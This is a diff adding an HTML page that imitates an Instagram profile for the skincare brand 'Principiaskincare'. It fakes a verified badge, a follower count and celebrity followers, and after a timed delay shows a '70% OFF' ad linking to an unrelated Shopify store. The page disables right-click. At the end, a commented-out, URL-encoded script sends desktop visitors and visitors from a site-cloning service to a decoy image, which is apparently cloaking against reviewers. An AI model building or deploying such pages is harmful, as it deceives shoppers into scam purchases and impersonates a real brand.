@@ -1,0 +1,448 @@
+<html lang="pt-BR"><head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+    <link href="css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #fff;
+        }
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .verified-icon {
+            margin-left: 4px;
+            display: inline-flex;
+            align-items: center;
+        }
+        .verified-icon img {
+            width: 14px;
+            height: 14px;
+        }
+        .profile-image-container {
+            width: 84px;
+            height: 84px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            padding: 2px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .profile-image {
+            width: calc(100% - 4px);
+            height: calc(100% - 4px);
+            object-fit: cover;
+            border-radius: 50%;
+            border: 2px solid white;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-icon {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 2px solid #fff;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        .fixed-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: white;
+            z-index: 1000;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+        }
+        .content-padding {
+            padding-top: 40px;
+        }
+        .custom-blue {
+            background-color: #1977F2;
+            color: white;
+        }
+        .custom-blue-text {
+            color: #1977F2;
+        }
+        .btn-text {
+            font-weight: 600;
+        }
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #1977F2;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        .nav-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .search-icon {
+            font-size: 20px;
+        }
+        .plus-icon-container {
+            width: 24px;
+            height: 24px;
+            border: 2px solid black;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .plus-icon {
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .image-with-line {
+            position: relative;
+        }
+        .image-with-line::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 2.5px;
+            background-color: black;
+            margin-bottom: 3px;
+        }
+        #story-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            display: none;
+            overflow: hidden;
+        }
+        #story-content {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        #popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            padding: 20px;
+            z-index: 1000;
+            max-width: 90%;
+            width: 350px;
+            border: 1px solid #e0e0e0;
+        }
+        .highlight-image {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .popup-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+        .popup-profile {
+            display: flex;
+            align-items: center;
+        }
+        .popup-profile img {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .popup-content {
+            margin-bottom: 16px;
+        }
+        .popup-button {
+            background-color: #1977F2;
+            color: white;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            transition: background-color 0.3s;
+        }
+        .popup-button:hover {
+            background-color: #1664D6;
+        }
+        .verified-icon-popup {
+            width: 12px;
+            height: 12px;
+            display: inline-block;
+            vertical-align: middle;
+            margin-left: 4px;
+        }
+    </style>
+</head>
+<body class="bg-white">
+    <div id="loading-screen">
+        <img src="images/instagram-logo-instagram-icon-transparent-free-png.png" alt="Instagram Logo" class="w-48 h-48">
+    </div>
+
+    <div id="content" class="max-w-md mx-auto bg-white min-h-screen hidden">
+        <header class="fixed-header flex items-center justify-between bg-white">
+            <i class="fas fa-arrow-left text-black text-lg"></i>
+            <h1 class="text-black text-base font-semibold flex items-center">
+                Principiaskincare
+                <span class="verified-icon">
+                    <img src="https://img.icons8.com/?size=512&amp;id=2sZ0sdlG9kWP&amp;format=png" alt="Verified icon">
+                </span>
+            </h1>
+            <i class="fas fa-ellipsis-h text-black text-lg"></i>
+        </header>
+
+        <div class="content-padding">
+            <div class="px-4 mt-8">
+                <div class="flex items-center">
+                    <div id="profileImageContainer" class="profile-image-container">
+                        <img id="profileImage" alt="Granado logo with green background and white text" class="profile-image" src="images/principia banner 2 - limpo.png">
+                    </div>
+                    <div class="flex-1 ml-8">
+                        <div class="flex justify-between text-center">
+                            <div>
+                                <div class="font-bold">172</div>
+                                <div class="text-xs">publicações</div>
+                            </div>
+                            <div>
+                                <div class="font-bold">2,1 M </div>
+                                <div class="text-xs">seguidores</div>
+                            </div>
+                            <div>
+                                <div class="font-bold">1362</div>
+                                <div class="text-xs">seguindo</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="mt-4">
+                    <h2 class="font-bold">Principia skincare</h2>
+                    <p class="text-sm">Dermocosméticos de alta performance com transparência e preços justos.</p>
+ <p class="text-sm"> Pele bonita e saudável para todas e todos.</p>                  
+
+
+<p class="text-sm">Quer saber mais? Confira ⤵️</p>
+                    <p class="text-sm custom-blue-text">Ver tradução</p>
+                    <a class="custom-blue-text text-sm" href="https://www.principia-skincare.site">bit.ly/3EbnDxL</a>
+                </div>
+                <div class="mt-2 flex items-center">
+                    <img alt="Small profile pictures of followers" class="w-8 h-8 rounded-full" height="30" src="images/4456129.jpg" width="30">
+                    <p class="text-sm ml-2">Seguido(a) por <strong>anitta, whinderssonnunes</strong> e <strong>outras 24 pessoas</strong></p>
+                </div>
+                <div class="flex mt-4 space-x-2">
+                    <button id="followButton" class="flex-1 custom-blue py-1.5 rounded flex items-center justify-center">
+                        <span id="buttonText" class="btn-text">Seguir</span>
+                        <div class="loading-icon ml-2"></div>
+                        <svg id="downArrow" class="ml-1 hidden" aria-label="Ícone de seta para baixo" fill="currentColor" height="12" role="img" viewBox="0 0 24 24" width="12">
+                            <title>Ícone de seta para baixo</title>
+                            <path d="M12 16.502l-7.293-7.296a1 1 0 1 1 1.414-1.414L12 13.67l5.879-5.878a1 1 0 1 1 1.414 1.414L12 16.502z"></path>
+                        </svg>
+                    </button>
+                    <button id="messageButton" class="flex-1 text-black py-1.5 rounded" style="background-color: #F3F4F6;">
+                        <span class="btn-text">Mensagem</span>
+                    </button>
+                    <button class="px-2 py-1.5 rounded" style="background-color: #F3F4F6;">
+                        <i class="fas fa-user-plus btn-text"></i>
+                    </button>
+                </div>
+            </div>
+            <div class="flex p-4 space-x-4 overflow-x-auto">
+                <div class="flex flex-col items-center">
+                    <div class="w-16 h-16 rounded-full border-2 border-gray-300 flex items-center justify-center overflow-hidden">
+                        <img alt="Warning sign for alert" class="w-14 h-14 object-cover" src="images/images/108493404_301305327586776_6656891219592119022_n.jpg">
+                    </div>
+                    <span class="text-xs mt-1">match perfeito✨</span>
+                </div>
+                <div class="flex flex-col items-center">
+                    <div id="ajudeRSContainer" class="w-16 h-16 rounded-full border-2 border-gray-300 flex items-center justify-center overflow-hidden">
+                        <img id="ajudeRSImage" alt="Retrospective campaign" class="w-14 h-14 object-cover" src="images/snapinsta.jpg">
+                    </div>
+                    <span class="text-xs mt-1">Laçamentos</span>
+                </div>
+            </div>
+            <div class="flex justify-around pt-2 mb-2">
+                <img src="images/IMG-7309.jpg" alt="Grid icon" class="w-6 h-6 object-cover">
+                <img src="images/IMG-7305.jpg" alt="Reels icon" class="w-6 h-6 object-cover">
+                <img src="images/IMG-7306.jpg" alt="User icon" class="w-6 h-6 object-cover">
+            </div>
+            <div class="grid grid-cols-3 gap-1 mt-1">
+                <div class="image-with-line">
+                    <img alt="Granado product display" class="w-full aspect-square object-cover" src="images/principia post1.jpg">
+                </div>
+                <img alt="Granado store interior" class="w-full aspect-square object-cover" src="images/O Skincare tá ON a partir de R$43,99.jpg">
+                <img alt="Granado product lineup" class="w-full aspect-square object-cover" src="images/Blog_36.jpg">
+                <img alt="Granado skincare products" class="w-full aspect-square object-cover" src="images/Snapinsta.app_142527029_2739946282985504_6669494772223172291_n_1080.jpg">
+                <img alt="Granado soap collection" class="w-full aspect-square object-cover" src="images/https%253A%252F%252Fsubstack-post-media.s3.amazonaws.com%252Fpublic%252Fimages%252Fa10a9e89-8d88-4285-b8cd-9d4d948a5650_640x437.jpeg">
+                <img alt="Granado perfume bottles" class="w-full aspect-square object-cover" src="images/Blog_17.jpg">
+                <img alt="Granado store facade" class="w-full aspect-square object-cover" src="images/nperca1570.jpg">
+                <img alt="Granado bath products" class="w-full aspect-square object-cover" src="images/post_thumbnail-d0c5f2aebc48a5b24a40c10db3c56ede.jpg">
+                <img alt="Granado gift set" class="w-full aspect-square object-cover" src=" images/2RY0071-1.jpg"> 
+            </div>
+            <div class="flex flex-col items-center justify-center mt-4 mb-20">
+                <p class="text-gray-500 text-sm mb-2">Carregando publicações antigas</p>
+                <div class="loading-spinner"></div>
+            </div>
+        </div>
+        <nav class="fixed bottom-0 left-0 right-0 bg-white">
+            <div class="flex justify-around py-4 items-center">
+                <div class="nav-icon">
+                    <img src="images/IMG-7308-2.jpg" alt="Home icon" class="w-6 h-6 object-cover">
+                </div>
+                <div class="nav-icon">
+                    <i class="fas fa-search search-icon"></i>
+                </div>
+                <div class="plus-icon-container">
+                    <span class="plus-icon">+</span>
+                </div>
+                <div class="nav-icon">
+                    <img src="images/IMG-7307.jpg" alt="Reels icon" class="w-6 h-6 object-cover">
+                </div>
+                <div class="nav-icon">
+                    <img alt="Granado logo with green background and white text" class="w-6 h-6 rounded-full" src="images/principia banner 2 - limpo.png">
+                </div>
+            </div>
+        </nav>
+    </div>
+
+    <div id="story-overlay">
+        <iframe id="story-content" src=""></iframe>
+    </div>
+
+    <div id="popup" class="hidden">
+        <div class="popup-header">
+            <div class="popup-profile">
+                <img src="images/principia banner 2 - limpo.png">
+                <div>
+                    <span class="font-semibold text-sm">Principiaskincare</span>
+                    <img src="https://img.icons8.com/?size=512&amp;id=2sZ0sdlG9kWP&amp;format=png" alt="Verified icon" class="verified-icon-popup" width="10" height="10">
+                </div>
+            </div>
+            <span class="text-xs text-gray-500">Publicidade</span>
+        </div>
+        <div class="popup-content">
+            <p class="text-base font-medium mb-2">70% OFF para transformar sua rotina de skincare! 🎉 </p>
+            <p class="text-sm text-gray-600">Aproveite nossa promoção de Black Friday para renovar seu skincare com descontos irresistíveis! Cuide da sua pele com a qualidade Principia.</p>
+            <p class="text-xs text-gray-500 mt-2">Conta autenticada</p>
+        </div>
+        <a href="https://melhorprodutogran.myshopify.com" target="_blank" class="popup-button block">
+            Ir para o site
+        </a>
+    </div>
+
+    
+    <script>
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+  });
+</script>
+
+
+    <script>
+        let contentLoaded = false;
+
+        setTimeout(function() {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('content').classList.remove('hidden');
+            contentLoaded = true;
+            
+            // Mostrar o popup 3 segundos após o carregamento do perfil
+            setTimeout(function() {
+                document.getElementById('popup').classList.remove('hidden');
+            }, 3000);
+        }, 3000);
+
+        const followButton = document.getElementById('followButton');
+        const buttonText = document.getElementById('buttonText');
+        const loadingIcon = document.querySelector('.loading-icon');
+        const downArrow = document.getElementById('downArrow');
+
+        followButton.addEventListener('click', function() {
+            buttonText.style.display = 'none';
+            loadingIcon.style.display = 'block';
+            
+            setTimeout(function() {
+                loadingIcon.style.display = 'none';
+                buttonText.style.display = 'inline';
+                buttonText.textContent = 'Seguindo';
+                downArrow.classList.remove('hidden');
+                
+                followButton.classList.remove('custom-blue');
+                followButton.style.backgroundColor = '#F3F4F6'; followButton.classList.add('text-black');
+                downArrow.setAttribute('fill', 'currentColor');
+            }, 2000);
+        });
+
+        const messageButton = document.getElementById('messageButton');
+        messageButton.addEventListener('click', function() {
+            window.location.href = '/chat.html';
+        });
+
+        const profileImage = document.getElementById('profileImage');
+        const profileImageContainer = document.getElementById('profileImageContainer');
+        const storyOverlay = document.getElementById('story-overlay');
+        const storyContent = document.getElementById('story-content');
+
+        let isClicked = false;
+
+        profileImage.addEventListener('click', function() {
+            if (!isClicked) {
+                isClicked = true;
+                profileImageContainer.style.background = '#f0f0f0';
+            }
+
+            // Load and display the story.html content
+            storyContent.src = 'story.html';
+            storyOverlay.style.display = 'block';
+            
+            // Hide the story overlay after 15 seconds
+            setTimeout(() => {
+                storyOverlay.style.display = 'none';
+                storyContent.src = '';
+            }, 15000);
+        });
+        
+        
+    </script>
+
+    <script>
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+  });
+</script>
+
+<!--	<script type="text/javascript">
+document.write(unescape('%20%20%20%20%20%3C%2F%73%63%72%69%70%74%3E%0A%09%20%20%20%20%20%20%20%20%20%20%3C%73%63%72%69%70%74%3E%20%69%66%20%28%64%6F%63%75%6D%65%6E%74%2E%72%65%66%65%72%72%65%72%2E%69%6E%64%65%78%4F%66%28%22%73%61%76%65%77%65%62%32%7A%69%70%2E%63%6F%6D%22%29%20%21%3D%3D%20%2D%31%29%20%7B%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%22%68%74%74%70%73%3A%2F%2F%6D%65%75%73%61%6E%69%6D%61%69%73%2E%63%6F%6D%2E%62%72%2F%77%70%2D%63%6F%6E%74%65%6E%74%2F%75%70%6C%6F%61%64%73%2F%32%30%32%31%2F%30%34%2F%61%6E%69%6D%61%6C%2D%66%65%69%6F%2D%61%73%73%75%73%74%61%64%6F%2D%33%30%30%78%32%30%30%2E%6A%70%67%3F%61%75%74%6F%3D%77%65%62%70%26%71%75%61%6C%69%74%79%3D%36%30%26%77%69%64%74%68%3D%31%39%32%30%26%63%72%6F%70%3D%31%36%3A%39%2C%73%6D%61%72%74%2C%73%61%66%65%22%3B%20%2F%2F%20%52%65%64%69%72%65%63%69%6F%6E%61%20%70%61%72%61%20%75%6D%20%55%52%4C%20%65%73%70%65%63%C3%AD%66%69%63%6F%20%7D%20%3C%2F%73%63%72%69%70%74%3E%0A%20%20%0A%3C%73%63%72%69%70%74%3E%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%44%4F%4D%43%6F%6E%74%65%6E%74%4C%6F%61%64%65%64%22%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%20%69%66%20%28%21%2F%4D%6F%62%69%7C%41%6E%64%72%6F%69%64%7C%69%50%68%6F%6E%65%2F%69%2E%74%65%73%74%28%6E%61%76%69%67%61%74%6F%72%2E%75%73%65%72%41%67%65%6E%74%29%29%20%7B%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%22%68%74%74%70%73%3A%2F%2F%6D%65%75%73%61%6E%69%6D%61%69%73%2E%63%6F%6D%2E%62%72%2F%77%70%2D%63%6F%6E%74%65%6E%74%2F%75%70%6C%6F%61%64%73%2F%32%30%32%31%2F%30%34%2F%61%6E%69%6D%61%6C%2D%66%65%69%6F%2D%61%73%73%75%73%74%61%64%6F%2D%33%30%30%78%32%30%30%2E%6A%70%67%3F%61%75%74%6F%3D%77%65%62%70%26%71%75%61%6C%69%74%79%3D%36%30%26%77%69%64%74%68%3D%31%39%32%30%26%63%72%6F%70%3D%31%36%3A%39%2C%73%6D%61%72%74%2C%73%61%66%65%22%3B%20%7D%20%7D%29%3B%20%3C%2F%73%63%72%69%70%74%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%73%63%72%69%70%74%20%73%72%63%3D%22%6A%73%2F%6C%61%74%65%73%74%2E%6A%73%22%20%61%73%79%6E%63%3D%22%22%20%64%65%66%65%72%3D%22%22%3E%3C%2F%73%63%72%69%70%74%3E'));
+</script>
+    <script> -->
+
+</body></html>
